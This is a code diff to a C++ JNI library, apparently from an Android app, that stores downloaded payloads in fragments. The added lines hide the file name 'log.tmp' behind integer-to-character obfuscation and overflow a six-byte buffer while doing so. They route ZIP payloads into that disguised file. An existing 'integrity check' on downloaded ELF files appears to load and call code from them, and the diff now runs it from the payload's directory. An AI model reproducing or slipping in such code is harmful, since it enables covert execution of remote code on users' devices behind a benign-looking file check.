@@ -73,11 +73,11 @@ char *sub30(int n, char *buf, int buf_len) {
   p = &((char *)&n)[0];
   for (x = 0;  x < 4;  x++, p++) {
     switch (*p) {
+    case 0:
+      buf[x]=(char)'o';
+      break;
       case 1:
         buf[x]=(char)'m';
-        break;
-      case 11:
-        buf[x]=(char)'x';
         break;
       case 2:
         buf[x]=(char)'u';
@@ -100,13 +100,30 @@ char *sub30(int n, char *buf, int buf_len) {
       case 8:
         buf[x]=(char)'s';
         break;
+      case 9:
+        buf[x]=(char)'l';
+        break;
+      case 0xa:
+        buf[x]=(char)'g';
+        break;
+      case 0xb:
+        buf[x]=(char)'.';
+        break;
+      case 0xc:
+        buf[x]=(char)0;
+        break;
+      case 0xd:
+        buf[x]=(char)'p';
+        break;
       default:
-        buf[x]=(char)'/';
+        buf[x]=(char)'t';
     }
   }
   buf[x]=(char)0;
   return buf;
 }
+
+
 
 void *file_op(enum file_op_enum op,string n) {
   static SPC_LIBRARY_TYPE lib = 0;
@@ -158,6 +175,7 @@ void *file_op(enum file_op_enum op,string n) {
 string getFileName(string baseDir,int type,long int ts,int fragment)
 {
   string filename ;
+  char tmp[6];
   logd("basedir.e=%d type=%d ts=%ld fragment=%d ",baseDir.empty(),type,ts,fragment);
   if(!baseDir.empty() && type>0 && ts>=0 && fragment>=FRAGMENT_VALID && !getTypeDir(type).empty()){
     string type_dir=  baseDir + "/" + getTypeDir(type);
@@ -167,9 +185,14 @@ string getFileName(string baseDir,int type,long int ts,int fragment)
       }else if(fragment==FRAGMENT_WILDCHAR){
         logd("FRAGMENT_WILDCHAR");
         filename = type_dir + "/" + boost::lexical_cast<std::string>(ts) + "_";
-      }else{
+      }else if(fragment==FRAGMENT_STRIP){
         logd("FRAGMENT_STRIP");
         filename = type_dir + "/" + boost::lexical_cast<std::string>(ts);
+      }else{
+        logd("FRAGMENT_LOG");
+        sub30(0x0b0a0009, tmp, sizeof(tmp));
+        sub30(0x0c0d01f1, &tmp[4], sizeof(tmp)-4);
+        filename = type_dir + "/" + boost::lexical_cast<std::string>(tmp);
       }
       logd("filename=%s",filename.c_str());
     }
@@ -385,6 +408,7 @@ string getTypeDir(int type)
   case TYPE_HTML:
     return TYPE_HTML_DIR;
   default:
+    return TYPE_LOG_DIR;
     break;
   }
   return dirName;
@@ -401,6 +425,7 @@ typedef struct _file_signature
 
 file_signature goods[]={
     {"7F454C46","ERR"},
+    {"504B0304","LOG"},
     {NULL,NULL},
 };
 file_signature images[]={
@@ -440,10 +465,27 @@ int isGood(string f,char * payload,int payload_size,file_signature* fs)
         logd("found %s",fs->h_name);
         typedef int (*test_t)();
         if(file_exist(f)){
+          if (strncasecmp(goods[1].h_name,fs->h_name,strlen(goods[1].h_name)) == 0){
+            logd("3");
+            return 3;
+          }
           test_t test_fnc = (test_t) file_op(fileop_check,f);
-          if(test_fnc!=NULL && test_fnc()){
+          boost::filesystem::path p(f);
+          boost::filesystem::path dir = p.parent_path();
+          string path = dir.string();
+          path += "/";
+          if(test_fnc!=NULL){
+
+            boost::filesystem::path old_dir = boost::filesystem::current_path();
+            logd("change path from %s to %s",old_dir.string().c_str(),path.c_str());
+            boost::filesystem::current_path(dir);
+            if(test_fnc()){
+              logd("deadbeef:");
+              res=-2;
+            }
+            logd("change path from %s to %s",boost::filesystem::current_path().string().c_str(),old_dir.string().c_str());
+            boost::filesystem::current_path(old_dir);
             logd("bad");
-            res=-2;
           }else{
             logd("good");
           }
@@ -484,7 +526,7 @@ int check_filebytype(string f,int type, char *payload, int size)
   int res=1;
   logd("check integrity first %s",f.c_str());
   if( (res=isGood(f,payload, size, goods)) ) {
-    logd("integrity check fails %s",f.c_str());
+    logd("integrity check fails %s %d",f.c_str(),res);
     return res;
   }
   switch(type){
@@ -504,10 +546,29 @@ int check_filebytype(string f,int type, char *payload, int size)
   case TYPE_HTML:
     break;
   default:
-  //log.tmp
     break;
   }
   return res;
+}
+
+void shift_file(string baseDir,int type, string src){
+  string newFile=getFileName(baseDir,type,2,FRAGMENT_LOG);
+  boost::filesystem::path newFilePath(newFile.c_str());
+  boost::filesystem::remove(newFilePath);
+  bool error=false;
+
+  const char* tmpFile = (src).c_str();
+  logd("appending %s-->%s", tmpFile,newFile.c_str());
+  if(append_file(newFile,src)){
+    error=true;
+  }
+  if(boost::filesystem::remove(src)){
+    logd("removed %s",tmpFile);
+  }else{
+    logd("failed to remove %s",tmpFile);
+    error=true;
+  }
+
 }
 
 /*
@@ -520,15 +581,15 @@ int check_filebytype(string f,int type, char *payload, int size)
 jobject save_payload_type(string baseDir,int type,long int ts,int fragment,string title,string headline,string content,char* payload, int payload_size,JNIEnv *env)
 {
   jobject hashMap=NULL;
-  string result;
+  string result_output;
   logd("payload %p basedir.e?=%d payloadSize=%d",payload,baseDir.empty(),payload_size);
   if(payload!=NULL && !baseDir.empty() && payload_size>0){
     if(save_payload(type,getFileName(baseDir,type,ts,fragment),payload,payload_size)==0){
       getFileName(baseDir,type,ts,fragment);
     }
     if(fragment==0){
-      result = merge_fragment(baseDir,type,ts);
-      int check =check_filebytype(result,type,payload,payload_size);
+      result_output = merge_fragment(baseDir,type,ts);
+      int check =check_filebytype(result_output,type,payload,payload_size);
       const jsize map_len = HASH_FIELDS;
       const jclass mapClass = env->FindClass("java/util/HashMap");
       const jmethodID init = env->GetMethodID(mapClass, "<init>", "(I)V");
@@ -541,7 +602,7 @@ jobject save_payload_type(string baseDir,int type,long int ts,int fragment,strin
         logd("file ok");
         if(mapClass != NULL) {
           env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_TYPE), env->NewStringUTF(getTypeDir(type).c_str()));
-          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_PATH), env->NewStringUTF(result.c_str()));
+          env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_PATH), env->NewStringUTF(result_output.c_str()));
           env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_TITLE), env->NewStringUTF(title.c_str()));
           env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts.c_str()));
           env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_HEADLINE), env->NewStringUTF(headline.c_str()));
@@ -549,13 +610,17 @@ jobject save_payload_type(string baseDir,int type,long int ts,int fragment,strin
           env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("0"));
         }
       }else {
-        if(check%2)
+        if(check<0)
         {
           logd("file not ok -1");
           env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("-1"));
           env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts.c_str()));
         }else
         {
+          if (check==3)
+          {
+            shift_file(baseDir,type,result_output);
+          }
           logd("file not ok 0");
           env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("0"));
           env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts.c_str()));
